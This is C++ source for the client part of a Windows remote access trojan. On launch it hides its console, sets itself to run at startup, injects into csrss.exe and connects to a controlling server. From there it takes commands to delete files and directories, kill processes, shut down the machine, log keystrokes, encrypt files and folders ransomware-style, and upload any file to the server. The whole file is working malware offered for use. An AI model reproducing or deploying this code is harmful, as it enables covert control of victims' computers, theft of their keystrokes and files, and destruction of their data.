/*
 * WARNING!
 * This software is the full property of the author
 * Not intended for dumb kids
 * Copyright (c) 2020 by Nikait
 *
 * client part
*/


#include <winsock2.h>
#include <fstream>
#include <string>
#include <iostream>

#include "Autorun.h"
#include "Config.h"
#include "Socket.h"
#include "Crypt.h"
#include "Utils.h"
#include "Keylogger.h"

#pragma warning(disable: 4996)

std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars;

int Shell(SOCKADDR_IN addr);


int main() {
	// hide console
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	setlocale(LC_ALL, "Russian");
	// autorun
	RegisterProgram();
	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);

	HINSTANCE hKernel;

	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
	if (hKernel) {
		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
			GetProcAddress(hKernel, "RegisterServiceProcess");
	}
	// end autorun

	// server configuration start
	SOCKADDR_IN add = Server();
	// start kurva
	Shell(add);
	return 0;
}

int Shell(SOCKADDR_IN addr) {
	char path[2048];
	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
		return 1;
	}
	char buffer[256];
	while (true) {
		// deliting the temp file for commands
		std::ifstream tmp_f("file.txt");
		if (tmp_f.is_open()) {
			tmp_f.close();
			system("del file.txt");
		}

		// clear varibales
		buf_file = "";
		loc_buf_file = "";
		memset(&buffer, 0x0, sizeof(buffer));
		recv(conn, buffer, sizeof(buffer), NULL);

		if (strcmp(buffer, "ls") == 0) {
			char path[1024];
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "dir " + std::string(path) + " > file.txt";
			system(comm.c_str());
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);

		}

		else if (strcmp(buffer, "rm") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "del " + std::string(path);
			system(comm.c_str());
			std::string finally_msg = "delete " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (strcmp(buffer, "rmdir") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "RMDIR /S /Q " + std::string(path);
			system(comm.c_str());
			std::string finally_msg = "delete " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (strcmp(buffer, "pwd") == 0) {
			system("echo %cd% > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
		}

		else if (strcmp(buffer, "sysinfo") == 0) {
			system("systeminfo > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
		}

		else if (strcmp(buffer, "ps") == 0) {
			system("tasklist > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 220, NULL);
		}

		else if (strcmp(buffer, "kill") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string com = "taskkill /T /F /IM " + std::string(path);
			system(com.c_str());
			std::string finally_msg = "terminate " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (!strcmp(buffer, "shutdown")) {
			system("shutdown /p");
		}

		else if (!strcmp(buffer, "error")) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
		}

		else if (!strcmp(buffer, "keylogger")) {
			memset(&path, 0x0, sizeof(path));
			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
			recv(conn, path, sizeof(path), NULL);
			while (buf.length() < unsigned int(atoi(path) + 7) && rbuf.length() < unsigned int(atoi(path) + 7)) {
				keylogger(keylog_path);
				buf = readFile(keylog_path + "keylog.txt");
				rbuf = readFile(keylog_path + "keylogru.txt");
			}
			key_ret = "\nen:\n" + buf + "\n\nru:\n" + rbuf;
			keydel = "del " + keylog_path + "keylog.txt";
			rkeydel = "del " + keylog_path + "keylogru.txt";
			system(keydel.c_str());
			system(rkeydel.c_str());
			send(conn, key_ret.c_str(), sizeof(key_ret) * 100, NULL);

			memset(&buf, 0x0, sizeof(buf));
			memset(&rbuf, 0x0, sizeof(rbuf));
		}

		else if (!strcmp(buffer, "cryptfile")) {
			char key[128];
			memset(&path, 0x0, sizeof(path));
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptFile(path, atoi(key));
			send(conn, res.c_str(), sizeof(res) * 300, NULL);
		}

		else if (!strcmp(buffer, "cryptdir")) {
			char key[128];
			memset(&path, 0x0, sizeof(path));
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptDir(path, atoi(key));
			send(conn, res.c_str(), sizeof(res) * 300, NULL);
		}

		else if (!strcmp(buffer, "download")) {
			recv(conn, path, sizeof(path), NULL);
			std::ifstream d_file(path);
			std::cout << "path: " << path;
			if (!d_file.is_open()) send(conn, "exist", 5, NULL);
			else {
				std::string file_data = readFile(path);
				send(conn, file_data.c_str(), file_data.length(), NULL);
			}
		}

		else if (strcmp(buffer, "close") == 0) return 1;
	}
	return 0;
}
